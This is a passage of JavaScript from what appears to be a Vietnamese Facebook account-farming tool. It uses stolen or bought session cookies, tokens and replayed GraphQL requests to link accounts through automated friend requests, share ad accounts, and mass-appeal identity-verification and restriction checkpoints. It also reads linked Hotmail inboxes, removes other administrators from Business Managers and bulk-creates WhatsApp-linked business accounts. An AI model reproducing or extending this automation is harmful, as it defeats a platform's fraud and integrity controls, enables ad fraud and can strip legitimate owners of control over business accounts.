                                                                        "method": "POST"
                                                                    })

                                                                    const data = await res.text()

                                                                    if (data.includes('"OUTGOING_REQUEST"')) {

                                                                        send('message', {id: item.id, message: 'Gửi lời mời kết bạn thành công'})

                                                                        addFriendSuccess = true
                                                                    } else if (data.includes('"ARE_FRIENDS"')) {

                                                                        send('message', {id: item.id, message: 'Đã kết bạn trước đó'})

                                                                        areFriend = true
                                                                        addFriendSuccess = true
                                                                        acceptFriendSuccess = true

                                                                    } else {
                                                                        send('message', {id: item.id, message: 'Không thể gửi lời mời kết bạn'})
                                                                    }

                                                                } catch {}

                                                                if (addFriendSuccess && !areFriend) {

                                                                    try {

                                                                        send('message', {id: item.id, message: 'Đang chấp nhận lời mời kết bạn'})

                                                                        const res = await z.post("https://www.facebook.com/api/graphql/", {
                                                                            "headers": {
                                                                                "content-type": "application/x-www-form-urlencoded",
                                                                            },
                                                                            "body": "av="+target+"&__user="+target+"&__a=1&__req=t&__hs=19665.HYP%3Acomet_pkg.2.1..2.1&dpr=1&__ccg=GOOD&__rev=1009698433&__s=o0altq%3Aeafu2c%3A8x97bw&__hsi=7297600404377320341&__dyn=7AzHK4HwBgDx-5Q1ryaxG4QjFw9uu2i5U4e2C17yUJ3odF8vyUco2qwJyEiwsobo6u3y4o27xu9g5O0BU2_CxS320om78bbwto88422y11xmfz822wtU4a3a4oaEnxO0Bo4O2-2l2Utwwg4u0Mo4G1hx-3m1mzXw8W58jwGzEjxq1jxS6FobrwKxm5oe8464-5pUfEe88o4qum7-2K1yw9qm2CVEbUGdG1Fwh888cA0z8c84q58jwTwNxe6Uak2-362S269wkopg6C13whEeEfE-&__csr=gbcbiimxkR4ikybk8vbb2bZnRbclaGh4hIhkhNRflmRnOdFfSLZQBZOFJaWOuBTmqFK-BSGyCbHyEKBGAZ-npbDy6qHGoDQqiAGy-mmmcrBBggLGLh9qWRV8CGK9Kimhx1ey2S5AjxSey-qbgkCzo-WmeDCKnx2u54Eiy9Enm5ooCxafgKfyoSum5AbDUkUqxem33zVovGdx248yaxa6XmUhK59bxWayoK4EWdx64Ey5U2Ty9aUC1nxC5QqEsm2a8Bwl9US58fUHgK8G3y6Epy9KFpV87CUdAeyE-44nx-EG1myWCwzxrwJwxy-u2e7E4O5o27wKxOi0hLCy8jCy89mrhaUhAoukCCV7jiwi4ES5awwaDFR3kQ90qU28wn8twVz8gO0pGx658VAFKHyBG4EB0VK1Awbqi58b8410uU22xqK0wUbt3olhvxC1gK2e3O2yE0J2041k033Rw8q0ny0jW0Bpo097obU06tqyo5S0h-0nQw0aoo33w46G9w2040fuwtE9oS0BofVU0Xy0jW0lC1-wRDCw3ME16F60b2w3hU7m1dw3Ho5DxCE0uKw3vU988Fo0iDiyE09nS2C0UU1nEggiQ0d1F07Uw8y0beDyp6&__comet_req=15&fb_dtsg="+data.fb_dtsg+"&jazoest=5472&lsd=8NriD224Z0iWaLzZ_ikHNc&__aaid=0&__spin_r=1009698433&__spin_b=trunk&__spin_t=1699104999&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FriendingCometFriendRequestConfirmMutation&variables=%7B%22input%22%3A%7B%22attribution_id_v2%22%3A%22CometHomeRoot.react%2Ccomet.home%2Cvia_cold_start%2C1699104996472%2C226588%2C4748854339%2C%22%2C%22friend_requester_id%22%3A%22"+sender+"%22%2C%22source%22%3A%22rhc_friend_requests%22%2C%22actor_id%22%3A%22"+target+"%22%2C%22client_mutation_id%22%3A%221%22%7D%2C%22scale%22%3A1%2C%22refresh_num%22%3A0%7D&server_timestamps=true&doc_id=7035688403142455",
                                                                            "method": "POST",
                                                                        })

                                                                        if (res.includes('"ARE_FRIENDS"')) {

                                                                            send('message', {id: item.id, message: 'Đã chấp nhận lời mời kết bạn'})

                                                                            acceptFriendSuccess = true

                                                                        } else {
                                                                            send('message', {id: item.id, message: 'Không thể chập nhận lời mời kết bạn'})
                                                                        }

                                                                    } catch {
                                                                        send('message', {id: item.id, message: 'Không thể chập nhận lời mời kết bạn'})
                                                                    }

                                                                }

                                                            } else {

                                                                try {

                                                                    send('message', {id: item.id, message: 'Đang gửi lời mời kết bạn'})

                                                                    const res = await z.post("https://www.facebook.com/api/graphql/", {
                                                                        "headers": {
                                                                            "content-type": "application/x-www-form-urlencoded",
                                                                        },
                                                                        "body": "av="+sender+"&__user="+sender+"&__a=1&__req=p&__hs=19665.HYP%3Acomet_pkg.2.1..2.1&dpr=1&__ccg=EXCELLENT&__rev=1009698433&__s=tdp65f%3Aoo2g20%3A14aaa3&__hsi=7297598015669684550&__dyn=7AzHK4HzE4e5Q1ryaxG4VuC2-m1xDwAxu13wFwhUKbgS3q5UObwNwnof8boG0x8bo6u3y4o2vyE3Qwb-q7oc81xoswIK1Rwwwqo465o-cwfG12wOx62G5Usw9m1YwBgK7o884y0Mo4G1hx-3m1mzXw8W58jwGzE8FU5e7oqBwJK2W5olwUwgojUlDw-wUwxwjFovUy2a0SEuBwFKq2-azqwqo4i223908O3216xi4UdUcojxK2B0oobo8oC1hxB0qo4e16wWwjE&__csr=g8Y8MTq9kLOkJR8x4AZbMTLRbkLRPGAuBEWlOcDtQipZlZvqqWhe_KjsHqgDCF4GECrKnSEV5BAyAaF4KW9Dpbg_CzbZoO2mmcXBGA8DLDUhLBoOE-4mipFeEa9Eb8Sim8xiqdG9CF1y68Gu68W4ElF0iE-Uyi58iy8fHwMwSUlwyzo8p84GegmCwlEWdwJwmE5a4EOfDwzU9EaUnxq15wn8swIwBxy3y6Eaodo3pwAyE5q2m3-18U2Jw2WA324U5u0gC0Mo1jj042Aw5Zw5Pwo8qzo06ly00KaE0Zx03Vo6-2mdw9m3-u0eUw4-w7owRDCw1dSJw2DU8GweF0no1-E7m03We2i058E09762C0UU0j8w2xo0gew&__comet_req=15&fb_dtsg="+data.fb_dtsg+"&jazoest=25465&lsd=bDKLvgS6rXdNSQTYKST5kT&__aaid=0&__spin_r=1009698433&__spin_b=trunk&__spin_t=1699104443&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FriendingCometFriendRequestSendMutation&variables=%7B%22input%22%3A%7B%22attribution_id_v2%22%3A%22ProfileCometTimelineListViewRoot.react%2Ccomet.profile.timeline.list%2Cvia_cold_start%2C1699104440833%2C56049%2C190055527696468%2C%22%2C%22friend_requestee_ids%22%3A%5B%22"+target+"%22%5D%2C%22refs%22%3A%5Bnull%5D%2C%22source%22%3A%22profile_button%22%2C%22warn_ack_for_ids%22%3A%5B%22"+target+"%22%5D%2C%22actor_id%22%3A%22"+sender+"%22%2C%22client_mutation_id%22%3A%222%22%7D%2C%22scale%22%3A1%7D&server_timestamps=true&doc_id=7033797416660129",
                                                                    })

                                                                    if (res.includes('"OUTGOING_REQUEST"')) {

                                                                        send('message', {id: item.id, message: 'Gửi lời mời kết bạn thành công'})

                                                                        addFriendSuccess = true

                                                                    } else if (res.includes('"ARE_FRIENDS"')) {

                                                                        send('message', {id: item.id, message: 'Đã kết bạn trước đó'})

                                                                        areFriend = true
                                                                        addFriendSuccess = true
                                                                        acceptFriendSuccess = true

                                                                    } else {
                                                                        send('message', {id: item.id, message: 'Không thể gửi lời mời kết bạn'})
                                                                    }

                                                                } catch {}

                                                                if (addFriendSuccess && !areFriend) {

                                                                    try {

                                                                        send('message', {id: item.id, message: 'Đang chấp nhận lời mời kết bạn'})

                                                                        const res = await fetch("https://www.facebook.com/api/graphql/", {
                                                                            "headers": {
                                                                                "accept": "*/*",
                                                                                "accept-language": "en-US,en;q=0.9",
                                                                                "content-type": "application/x-www-form-urlencoded",
                                                                                "dpr": "0.9",
                                                                                "sec-ch-prefers-color-scheme": "light",
                                                                                "sec-fetch-dest": "empty",
                                                                                "sec-fetch-mode": "cors",
                                                                                "sec-fetch-site": "same-origin",
                                                                                "viewport-width": "2354",
                                                                                "x-asbd-id": "129477",
                                                                                "x-fb-friendly-name": "FriendingCometFriendRequestConfirmMutation",
                                                                                "x-fb-lsd": "DnPjnf7RbZWGiU5jeTTMlM",
                                                                                "cookie": acc273.cookies,
                                                                                "Referer": "https://www.facebook.com/",
                                                                                "Referrer-Policy": "strict-origin-when-cross-origin"
                                                                            },
                                                                            "body": "av="+target+"&__user="+target+"&__a=1&__req=z&__hs=19665.HYP%3Acomet_pkg.2.1..2.1&dpr=1&__ccg=GOOD&__rev=1009699624&__s=hcwf62%3Al32b9f%3Amf9c99&__hsi=7297673615366928756&__dyn=7AzHK4HzE4e5Q1ryaxG4VuC2-m1xDwAxu13wFwhUngS3q5UObwNwnof8boG0x8bo6u3y4o2vyE3Qwb-q7oc81xoswIK1Rwwwg8a8465o-cwfG12wOx62G5Usw9m1YwBgK7o884y0Mo4G1hx-3m1mzXw8W58jwGzE8FU5e7oqBwJK2W5olwUwOzEjUlDw-wUwxwjFovUy2a1ywtUuBwFKq2-azqwqo4i223908O3216xi4UdUcojxK2B0oobo8oC1hxB0qo4e16wWw-zU&__csr=gdslST4RmB2vfQxD5TkhkOOOnkOQwzIAzFZO8sLlSl94tmAAHuAAysLPq9WQ9nl7ZfnjVpFppG-mA8VaADAALVtqghUGcGmGhAF9VbBBK8CmFFbGV4ExuahoyuWBCyoGGRh8Z11edVaxjxa2ifAAG44m8yogxjx-t6ykm6ULgGVE9F4dyEiAnxirU4afxe4pEnx6EhF0nGVo4e4UkyQ7k3KbKexS4EiACwEBxG36cxy7FErDyoS8xGfwmEpwGwTx65Wxe7FolyoqyUvwuEC9DwkoWm6EyeAgS0w8jwSwCwjrwu81oE1hE6-0GonDUcU621yxC0pOew78wt8d84ii0EU5y4U0ao808so0oqg0zy0bcw0sJo0d3826w3S404lo9oS0BofVU1I81Ho5C0jW0ty3muq1VVdw5Xw6Do1cF60b2w3hU7m02mCq360608988Fo0jVw0Asoao3zw1cy0a5w4VDw-w2YA0PyHyWoigW&__comet_req=15&fb_dtsg="+acc273.dtsg+"&jazoest=25309&lsd=DnPjnf7RbZWGiU5jeTTMlM&__aaid=0&__spin_r=1009699624&__spin_b=trunk&__spin_t=1699122045&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FriendingCometFriendRequestConfirmMutation&variables=%7B%22input%22%3A%7B%22attribution_id_v2%22%3A%22CometHomeRoot.react%2Ccomet.home%2Cvia_cold_start%2C1699122042792%2C224627%2C4748854339%2C%22%2C%22friend_requester_id%22%3A%22"+sender+"%22%2C%22source%22%3A%22rhc_friend_requests%22%2C%22actor_id%22%3A%22"+target+"%22%2C%22client_mutation_id%22%3A%221%22%7D%2C%22scale%22%3A1%2C%22refresh_num%22%3A0%7D&server_timestamps=true&doc_id=7035688403142455",
                                                                            "method": "POST"
                                                                        })

                                                                        const data = await res.text()

                                                                        if (data.includes('"ARE_FRIENDS"')) {

                                                                            send('message', {id: item.id, message: 'Đã chấp nhận lời mời kết bạn'})

                                                                            acceptFriendSuccess = true

                                                                        } else {
                                                                            send('message', {id: item.id, message: 'Không thể chập nhận lời mời kết bạn'})
                                                                        }

                                                                    } catch {
                                                                        send('message', {id: item.id, message: 'Không thể chập nhận lời mời kết bạn'})
                                                                    }

                                                                }

                                                            }


                                                            if (addFriendSuccess && acceptFriendSuccess) {

                                                                send('message', {id: item.id, message: 'Đang share tài khoản'})

                                                                try {

                                                                    const res = await fetch("https://adsmanager-graph.facebook.com/v16.0/act_"+setting.idTkqc.value+"/users?_reqName=adaccount%2Fusers&access_token="+acc273.token+"&method=post&__cppo=1&_flowletID=4592", {
                                                                        "headers": {
                                                                            "accept": "*/*",
                                                                            "accept-language": "en-US,en;q=0.9",
                                                                            "content-type": "application/x-www-form-urlencoded",
                                                                            "sec-fetch-dest": "empty",
                                                                            "sec-fetch-mode": "cors",
                                                                            "sec-fetch-site": "same-site",
                                                                            "cookie": acc273.cookies,
                                                                            "Referer": "https://adsmanager.facebook.com/",
                                                                            "Referrer-Policy": "origin-when-cross-origin"
                                                                        },
                                                                        "body": "__activeScenarioIDs=%5B%5D&__activeScenarios=%5B%5D&__interactionsMetadata=%5B%5D&_reqName=adaccount%2Fusers&_reqSrc=AdsPermissionDialogController&_sessionID=638388347e50b49&account_id="+setting.idTkqc.value+"&include_headers=false&locale=vi_VN&method=post&pretty=0&role=281423141961500&suppress_http_code=1&uid="+item.uid+"&xref=fa4f06c2911f18",
                                                                        "method": "POST"
                                                                    })

                                                                    const data = await res.json()

                                                                    if (data.success) {
                                                                        send('message', {id: item.id, message: 'Share tài khoản thành công'})
                                                                        shareAccSuccess = true
                                                                    } else {
                                                                        send('message', {id: item.id, message: 'Share tài khoản thất bại'})
                                                                    }

                                                                } catch (err) {
                                                                    log(err)
                                                                    send('message', {id: item.id, message: 'Share tài khoản thất bại'})
                                                                }

                                                            }
                                                            
                                                        }

                                                    } else {

                                                        send('message', {id: item.id, message: 'Đã share 273 trước đó'})

                                                        shareAccSuccess = true
                                                    }

                                                    if (shareAccSuccess) {

                                                        if (setting.getLink273.value) {

                                                            const url273 = await z.getRedirect('https://adsmanager.facebook.com/accountquality/advertising_access/?callsite=15&id='+setting.idTkqc.value+'&enforcement=4&intent=1')

                                                            if (url273.includes('checkpoint/1501092823525282')) {

                                                                const id273 = url273.split('/')[5]

                                                                send('message', {id: item.id, message: 'Lấy link 273 thành công'})

                                                                lastMsg = 'Lấy link 273 thành công'

                                                                send('updateLink273', {id: item.id, link: id273})                                                     

                                                            } else {

                                                                send('message', {id: item.id, message: 'Lấy link 273 thất bại'})

                                                                lastMsg = 'Lấy link 273 thất bại'

                                                                send('updateLink273', {id: item.id, link: ' '})
                                                            }

                                                        } else {

                                                            let id273 = false

                                                            try {
                                                                if (item.link273 && item.link273.length > 1) {
                                                                    id273 = item.link273
                                                                } else {

                                                                    const url273 = await z.getRedirect('https://adsmanager.facebook.com/accountquality/advertising_access/?callsite=15&id='+setting.idTkqc.value+'&enforcement=4&intent=1')

                                                                    if (url273.includes('checkpoint/1501092823525282')) {
                                                                        id273 = url273.split('/')[5]
                                                                    }

                                                                }

                                                            } catch {}

                                                            if (id273) {

                                                                const check273 = await z.getRedirect('https://www.facebook.com/checkpoint/1501092823525282/'+id273)

                                                                if (check273.includes('checkpoint/1501092823525282')) {

                                                                    send('message', {id: item.id, message: 'Đang tiến hành kháng bằng 273'})

                                                                    try {

                                                                        await xmdt.khangXmdtApi(msg => {
                                                                            send('message', {id: item.id, message: msg})
                                                                        }, setting.idTkqc.value, id273)

                                                                        send('message', {id: item.id, message: 'Kháng bằng 273 thành công'})
                                                                        lastMsg = 'Kháng bằng 273 thành công'

                                                                    } catch (err) {

                                                                        if (err) {
                                                                            send('message', {id: item.id, message: 'Kháng bằng 273 thất bại: '+err})
                                                                            lastMsg = 'Kháng bằng 273 thất bại: '+err
                                                                        } else {
                                                                            send('message', {id: item.id, message: 'Kháng bằng 273 thất bại'})
                                                                            lastMsg = 'Kháng bằng 273 thất bại'

                                                                        }

                                                                    }

                                                                } else {
                                                                    send('message', {id: item.id, message: 'Link 273 lỗi'})
                                                                    lastMsg = 'Link 273 lỗi'
                                                                    send('updateLink273', {id: item.id, link: ' '})
                                                                }

                                                            } else {

                                                                send('message', {id: item.id, message: 'Link 273 lỗi'})
                                                                lastMsg = 'Link 273 lỗi'

                                                            }

                                                        }

                                                    }

                                                } catch (err) {
                                                    
                                                }

                                            } else {

                                                try {

                                                    if (quality.type === 'xmdt') {

                                                        send('message', {id: item.id, message: 'Đang tiến hành kháng XMDT'})

                                                        await xmdt.khangXmdtApi(msg => {
                                                            send('message', {id: item.id, message: msg})
                                                        })

                                                        send('message', {id: item.id, message: 'Kháng XMDT thành công'})
                                                        lastMsg = 'Kháng XMDT thành công'
                                                    }

                                                    if (quality.type === 'xmdt2') {

                                                        send('message', {id: item.id, message: 'Đang tiến hành kháng XMDT'})

                                                        await xmdt.khangXmdt2(msg => {
                                                            send('message', {id: item.id, message: msg})
                                                        })

                                                        send('message', {id: item.id, message: 'Kháng XMDT thành công'})
                                                        lastMsg = 'Kháng XMDT thành công'

                                                    }

                                                    if (quality.type === 'xmdt_cp') {

                                                        send('message', {id: item.id, message: 'Đang đá sang 956'})

                                                        const z = new zFetch(page)

                                                        let daSuccess = false

                                                        try {

                                                            const res = await z.post("https://www.facebook.com/accountquality/user_risk_review/enroll_in_epsilon/?_flowletID=2049", {
                                                                "headers": {
                                                                    "content-type": "application/x-www-form-urlencoded",
                                                                },
                                                                "body": "__usid=6-Ts4tl8113hvhc2%3APs4tl82grxp0%3A0-As4tl7m1rsnguq-RV%3D6%3AF%3D&session_id=4ae22a6cf6224c90&__user="+item.uid+"&__a=1&__req=u&__hs=19689.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1010048332&__s=wxjz02%3Acm1dy7%3A5yy264&__hsi=7306391866859334191&__dyn=7xeUmxa2C5rgydwCwRyU8EKnFG5UkBwCwgE98nCG6UmCyEgwjojyUW3qi4FoixWE-1txaczES2Sfxq4U5i486C6EC8yEScx60C9EcEixWq3i2q5E6e2qq1eCBBwLjzu2SmGxBa2dmm3mbK6U8o7y78jCgOUa8lwWxe4oeUuyo465udz87G5U2dz84a9DxW10wywWjxCU4C5pUao9k2B12ewzwAwRyUszUiwExq1yxJUpx2aK2a4p8y26U8U-UbE4S7VEjCx6Etwj84-224U-dwKwHxa1ozFUK1gzpA6EfEO32fxiFVoa9obGwgUy1kx6bCyVUCcG2-qaUK2e18w9Cu0Jo6-4e1mAKm221bzFHwCwNwDwjouxK2i2y1sDw9-&__csr=&fb_dtsg="+data.fb_dtsg+"&jazoest=25241&lsd=vAKfui5sPEsCReD8AXjm-W&__aaid=0&__spin_r=1010048332&__spin_b=trunk&__spin_t=1701151921&__jssesw=1",
                                                            })

                                                            if (res.includes('"payload":{"success":true}')) {

                                                                daSuccess = true

                                                                
                                                            } else {
                                                                send('message', {id: item.id, message: 'Đá sang 956 thất bại'})
                                                            }

                                                        } catch (err) {

                                                            send('message', {id: item.id, message: 'Đá sang 956 thất bại'})
                                                        }

                                                        if (daSuccess) {

                                                            try {

                                                                const xmdt = new Xmdt(page, item, setting, ip, data.fb_dtsg, data.accessToken, data.lsd, '')

                                                                let result = true
                                                                let page2 = false

                                                                if (setting.readEmailMode.value === 'browser') {

                                                                    page2 = await browser.newPage()

                                                                    const hotmail = new Hotmail(page2, setting, item, ip)

                                                                    try {

                                                                        await hotmail.login(message => {
                                                                            send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                                                        })

                                                                        await page.bringToFront()

                                                                    } catch {
                                                                        error = true
                                                                    }

                                                                } else {
                                                                    result = await checkImap(item.email, item.passMail)
                                                                }

                                                                if (result) {

                                                                    if (!error) {

                                                                        send('message', {id: item.id, message: 'Đang tiến hành mở khóa 956'})

                                                                        await xmdt.khang956Api(message => {
                                                                            send('message', {id: item.id, message})
                                                                        }, page2)

                                                                        quality = await account.getAccountQuality()

                                                                        if (quality.status) {
                                                                            send('updateStatus', {id: item.id, status: quality.status})
                                                                        }

                                                                        send('message', {id: item.id, message: 'Mở khóa 956 thành công'})

                                                                        lastMsg = 'Mở khóa 956 thành công'

                                                                    }

                                                                } else {
                                                                    send('message', {id: item.id, message: 'Mở khóa 956 thất bại: Mail die'})
                                                                }

                                                            } catch (err) {

                                                                log(err)

                                                                send('message', {id: item.id, message: 'Mở khóa 956 thất bại'})

                                                            }

                                                        }

                                                    }

                                                    error = false
                                                    
                                                } catch (err) {

                                                    log(err)

                                                    error = true

                                                    if (quality.status) {
                                                        send('updateStatus', {id: item.id, status: quality.status})
                                                    }

                                                    if (err) {
                                                        send('message', {id: item.id, message: 'Kháng XMDT thất bại: '+err})
                                                        lastMsg = 'Kháng XMDT thất bại: '+err
                                                    } else {
                                                        send('message', {id: item.id, message: 'Kháng XMDT thất bại'})
                                                        lastMsg = 'Kháng XMDT thất bại'
                                                    }

                                                }

                                            }

                                        }

                                        if (setting.khang902.value) {

                                            try {
            
                                                send('message', {id: item.id, message: 'Đang tiến hành kháng 902'})

                                                if (setting.khang902Treo.value) {

                                                    await xmdt.khang902Api(msg => {
                                                        send('message', {id: item.id, message: msg})
                                                    })
                                                
                                                } else {
                                                    
                                                    await xmdt.khang902Api2(msg => {
                                                        send('message', {id: item.id, message: msg})
                                                    })
                                                    
                                                }

                                                error = false
                                
                                                send('message', {id: item.id, message: 'Kháng 902 thành công'})
                                                lastMsg = 'Kháng 902 thành công'
                                                
                                            } catch (err) {

                                                error = true
                                
                                                if (err) {
                                                    send('message', {id: item.id, message: 'Kháng 902 thất bại: '+err})
                                                } else {
                                                    send('message', {id: item.id, message: 'Kháng 902 thất bại'})
                                                }
                                            }

                                        }


                                    }


                                } catch (err) {

                                    log(err)

                                    send('message', {id: item.id, message: 'Không thể lấy trạng thái tài khoản'})

                                    error = true
                                }

                            }

                            if (mode === 'normal' && tool === 'bm' && !error) {

                                let accessToken = false

                                for (let index = 0; index < 10; index++) {

                                    try { process.kill(browser.process().pid, 0)} catch { break }
                                    
                                    try {
                                    
                                        accessToken = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)

                                        break
        
                                    } catch {}

                                    await page.waitForTimeout(5000)
                                    
                                }

                                if (accessToken) {

                                    const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, accessToken, data.lsd)

                                    if (setting.khangBm.value) {

                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let listBm = []

                                            if (setting.khangMode.value === 'all') {

                                                listBm = (await account.getBmStatus()).filter(item => item.type === 'DIE')

                                            }

                                            if (setting.khangMode.value === 'bmDieVv') {

                                                listBm = (await account.getBmStatus()).filter(item => item.type === 'DIE_VV')

                                            }

                                            if (setting.khangMode.value === 'bm350') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === 'DIE' && bmData.sharing_eligibility_status === 'enabled'
                                                })

                                            }

                                            if (setting.khangMode.value === 'bm50') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === 'DIE' && bmData.sharing_eligibility_status === 'disabled_due_to_trust_tier'
                                                })

                                            }

                                            if (setting.khangMode.value === 'id') {

                                                const bmStatus = await account.getBmStatus()
                                                let listId = []

                                                if (setting.listId.value.includes(',')) {
                                                    listId = setting.listId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.listId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                listBm = listId.filter(item => item).map(item => {
                                                    return (bmStatus.filter(bm => bm.id === item.trim() && bm.type === 'DIE'))[0]
                                                }).filter(item => item)

                                            }

                                            let khangSuccess = 0

                                            if (listBm.length > 0) {

                                                for (let index = 0; index < listBm.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }
                                                    
                                                    const bm = listBm[index]

                                                    try {

                                                        send('message', {id: item.id, message: 'Đang kháng BM '+bm.id})

                                                        if (bm.restriction_type === 'ALE') {

                                                            const xmdt = new Xmdt(page, item, setting, ip, data.fb_dtsg, data.accessToken, data.lsd, '902')

                                                            await xmdt.khang902Api2(msg => {
                                                                send('message', {id: item.id, message: msg})
                                                            }, bm.id)

                                                        }

                                                        if (bm.restriction_type === 'PREHARM') {

                                                            const xmdt = new Xmdt(page, item, setting, ip, data.fb_dtsg, data.accessToken, data.lsd, 'xmdt')

                                                            await xmdt.khangXmdtApi(msg => {
                                                                send('message', {id: item.id, message: msg})
                                                            }, bm.id)

                                                        }

                                                        send('message', {id: item.id, message: 'Kháng BM '+bm.id+' thành công'})

                                                        lastMsg = 'Kháng BM '+bm.id+' thành công'

                                                        khangSuccess++

                                                    } catch {

                                                        error = true

                                                        send('message', {id: item.id, message: 'Kháng BM '+bm.id+' thất bại'})

                                                        lastMsg = 'Kháng BM '+bm.id+' thất bại'

                                                    }

                                                    await page.waitForTimeout(2000)

                                                }

                                                send('message', {id: item.id, message: 'Kháng thành công '+khangSuccess+'/'+listBm.length+' BM'})

                                                lastMsg = 'Kháng thành công '+khangSuccess+'/'+listBm.length+' BM'

                                            } else {
                                                send('message', {id: item.id, message: 'Không có BM để kháng'})
                                            }

                                        } catch {
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }

                                    }

                                    if (setting.removeAdmin.value) {

                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let accBm = (await account.getBm()).map(item => item.id)

                                            if (setting.removeMode.value === 'id') {

                                                let listId = []

                                                if (setting.removeAdminListId.value.includes(',')) {
                                                    listId = setting.removeAdminListId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.removeAdminListId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                accBm = accBm.filter(item => listId.includes(item))

                                            }

                                            const promises = []

                                            for (let index = 0; index < accBm.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }
                                                
                                                try {

                                                    const main = await account.getMainBmAccounts(accBm[index])
                                                    const accounts = (await account.getBmAccounts(accBm[index])).map(item => item.id)

                                                    if (accounts.length > 1 && accounts.includes(main)) {

                                                        const removeAccounts = accounts.filter(item => item !== main)

                                                        removeAccounts.forEach(async item => {
                                                            promises.push(account.removeAccount(accBm[index], item))
                                                        })

                                                    }

                                                } catch {}
                                                
                                            }

                                            send('message', {id: item.id, message: 'Đang xóa quản trị viên'})

                                            const result = await Promise.all(promises)

                                            const successed = result.filter(item => item)

                                            send('message', {id: item.id, message: 'Đã xóa '+successed.length+'/'+result.length+' quản trị viên'})


                                        } catch (err) {
                                            log(err)
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }
            
                                    }

                                    if (setting.outBm.value) {

                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let accBm = (await account.getBm()).map(item => item.id)

                                            if (setting.outBmMode.value === 'id') {

                                                let listId = []

                                                if (setting.outBmListId.value.includes(',')) {
                                                    listId = setting.outBmListId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.outBmListId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                accBm = accBm.filter(item => listId.includes(item))

                                            }

                                            if (accBm.length > 0) {
                                                
                                                try {

                                                    const accessToken = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)

                                                    let outBmSuccess = 0

                                                    for (let index = 0; index < accBm.length; index++) {

                                                        try { process.kill(browser.process().pid, 0)} catch { break }
                                                        
                                                        try {

                                                            send('message', {id: item.id, message: 'Đang thoát BM '+accBm[index]})

                                                            await account.outBm(accBm[index], accessToken)
                                                            
                                                            outBmSuccess++

                                                        } catch {}
                                                        
                                                    }

                                                    send('message', {id: item.id, message: 'Đã thoát thành công '+outBmSuccess+'/'+accBm.length+' BM'})

                                                } catch {
                                                    send('message', {id: item.id, message: 'Không thể lấy Access Token'})
                                                }
                                            }


                                        } catch (err) {
                                            log(err)
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }
            
                                    }

                                    if (setting.createBm.value) {

                                        const number = setting.bmNumber.value
                                        const type = setting.createBmMode.value

                                        let createBmSuccess = 0

                                        if (type === '350') {
                                            send('message', {id: item.id, message: 'Đang tạo BM350'})
                                        }

                                        if (type === '50') {
                                            send('message', {id: item.id, message: 'Đang tạo BM50'})
                                        }

                                        if (type === 'over') {
                                            send('message', {id: item.id, message: 'Đang tạo BM cổng over'})
                                        }

                                        if (type === 'xmdt') {
                                            send('message', {id: item.id, message: 'Đang tạo BM dame XMDT'})
                                        }


                                        if (type === 'wa') {

                                            let client = false
                                            let whatsApp = false

                                            const wa = new Db('whatsApp')

                                            send('message', {id: item.id, message: 'Đang tạo BM Whatsapp'})

                                            try {
                                                            
                                                send('message', {id: item.id, message: 'Đang lấy thông tin tài khoản Whatsapp'})
                                
                                                for (let index = 0; index < 99; index++) {
                                
                                                    try { process.kill(browser.process().pid, 0)} catch { break }
                                                    
                                                    try {
                                
                                                        whatsApp = await wa.findRandom(item => !item.running && item.active)
                                
                                                        if (whatsApp.number) {
                                                            break
                                                        }
                                
                                                    } catch {}

                                                    await page.waitForTimeout(1000)
                                
                                                }
                                
                                                if (whatsApp) {

                                                    wa.update(whatsApp.id, {running: true})

                                                    send('message', {id: item.id, message: 'Đang đăng nhập tài khoản Whatsapp'})

                                                    client = await loginWhatsApp(whatsApp.id)

                                                    send('message', {id: item.id, message: 'Đăng nhập Whatsapp thành công'})
                                
                                                }

                                            } catch {}

                                            if (client) {

                                                const fbPage = new Page(page, item, data.fb_dtsg, data.accessToken, data.lsd)

                                                const pages = await fbPage.getPage()

                                                for (let index = 0; index < pages.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }

                                                    const pageId = pages[index].additional_profile_id
                                                    const pageId2 = pages[index].id

                                                    let switchPageSuccess = false

                                                    try {

                                                        send('message', {id: item.id, message: 'Đang chuyển tài khoản sang page '+pageId})
                
                                                        await fbPage.switchPage(pageId)

                                                        send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thành công'})

                                                        switchPageSuccess = true
                                        
                                                    } catch {
                                                        send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thất bại'})
                                                    }

                                                    if (switchPageSuccess) {

                                                        try {

                                                            const pageData = await fbPage.getPageData(pageId2)

                                                            send('message', {id: item.id, message: 'Đang gỡ Whatsapp cũ'})

                                                            await fbPage.deleteWhatsApp(pageId, pageId2, pageData)

                                                            await fbPage.createPageWhatsApp(pageId, pageId2, pageData, client, msg => {
                                                                send('message', {id: item.id, message: msg})
                                                            })

                                                        } catch {}

                                                        let switchToMainSuccess = false

